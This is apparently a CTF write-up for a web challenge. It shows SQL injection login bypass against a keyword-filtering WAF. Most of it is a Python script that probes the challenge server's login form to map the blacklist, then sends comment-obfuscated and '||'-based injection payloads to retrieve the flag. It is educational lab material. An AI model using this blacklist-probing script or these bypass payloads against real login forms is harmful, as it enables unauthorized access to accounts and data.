---
date: 2025-01-15
description: SQLi blacklisted keywords and comments
platform: New Year CTF 2025
categories: Web
tags:
  - sqli
  - filter-bypass
duration:
---
# Admin
after trying login with generic SQLi payload, we get error indicating theres a WAF blocking input. After submiting manual payloads, try to script and find what words/ characters are blacklisted

![](_attachments/Pasted%20image%2020250115193043.png)

# Solution
- I wanted to know what characters / strings are blocked, i also observed mixed cases are banned, so I tried scripting and find which are invalid input
- Application responses 
	- "Произошла ошибка" : generic sql error?
	- "Запрос заблокирован WAF. Подозрительный ввод" : input is blocked by WAF
	- "Неверное имя пользователя или пароль": valid input but wrong credentials
## Observed blacklist
- mixed-case generic is blocked
- single line comments are blocked 
> after learning what blacklist might be  write custom payload using special characters / comments
## solve.py 
```python
import requests
from bs4 import BeautifulSoup 
from colorama import Fore, Style

url = "http://185.219.81.19:9999/login"
data = {
    "username":	"admin",
    "password":	"test"
}

observed_blacklist = []
reserved_keywords = [
    "SELECT", "INSERT", "UPDATE", "DELETE", "CREATE", "DROP", "ALTER", "FROM", "WHERE", 
    "JOIN", "AND", "OR", "NOT", "NULL", "TRUE", "FALSE", "IN", "BETWEEN", "LIKE", "IS", 
    "AS", "DISTINCT", "GROUP", "HAVING", "ORDER", "LIMIT", "OFFSET", "UNION", "EXCEPT", 
    "INTERSECT", "ALL", "ANY", "ASC", "DESC", "CASE", "WHEN", "THEN", "ELSE", "END", 
    "EXPLAIN", "PRAGMA", "ATTACH", "DETACH", "BEGIN", "COMMIT", "ROLLBACK", "SAVEPOINT", 
    "RELEASE", "ROLLBACK TO", "VACUUM", "ANALYZE", "REINDEX", "RENAME", "TRIGGER", "VIEW", 
    "INDEX", "TABLE", "COLUMN", "CONSTRAINT", "PRIMARY", "FOREIGN", "CHECK", "DEFAULT", 
    "UNIQUE", "NOT NULL", "REFERENCES", "ON DELETE", "ON UPDATE", "WITHOUT", "IF", "ELSEIF", 
    "RETURN", "ABORT", "FAIL", "IGNORE", "REPLACE"
]
special_characters = [
    "||", "=", "<", "<=", ">", ">=", "<>", "+", "-", "*", "/", "(", ")", ",", ".", ":", ";", 
    "'", "\"", "*", "%", "[]", "#"
]

payload_list=[
    "test' O/**/R '1'='1",
    "test' O/**/R +'1'='1",
    "test' -", 
    "test''-", #valid
    "test'--", #banned
    "test'+||+'1'='1", 
    "test' || '1'='1",
]

def attack_user(payload):
    # hard since comments are blocked
    pass

def attack_pass(payload):
    data["password"] = payload 
    resp = requests.post(url, data=data)
    if "Произошла ошибка" in resp.text:
        print(Fore.RED+"error:"+Style.RESET_ALL, data)
    elif "Неверное имя пользователя или пароль" in resp.text:
        print(Fore.YELLOW+"wrong credentials:"+Style.RESET_ALL, data)
    elif "Запрос заблокирован WAF. Подозрительный ввод" in resp.text:
        print(Fore.RED+"blocked:"+Style.RESET_ALL, data)
        soup = BeautifulSoup(resp.text, 'html.parser')
        banned = soup.find(style='color:red;').get_text()
        observed_blacklist.append(banned)
    else:
        print(Fore.GREEN+"huh????:"+Style.RESET_ALL, data)
        soup = BeautifulSoup(resp.text, 'html.parser')
        flag = soup.find(class_='flag-text')
        return flag
    return False

def find_blacklist():
    for c in reserved_keywords + special_characters :
        attack_pass("'"+c)

find_blacklist()
# observed blacklist: ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'AND', 'OR', 'UNION', 'DELETE', 'UPDATE', '#', '--']
# mixed-casing not work

# custom payloads
for payload in payload_list:
    flag = attack_pass(payload)
    if flag: 
        print(flag)
        break
print("blacklist:", observed_blacklist)
```
output
![](_attachments/Pasted%20image%2020250115192411.png)
![](_attachments/Pasted%20image%2020250113221428.png)


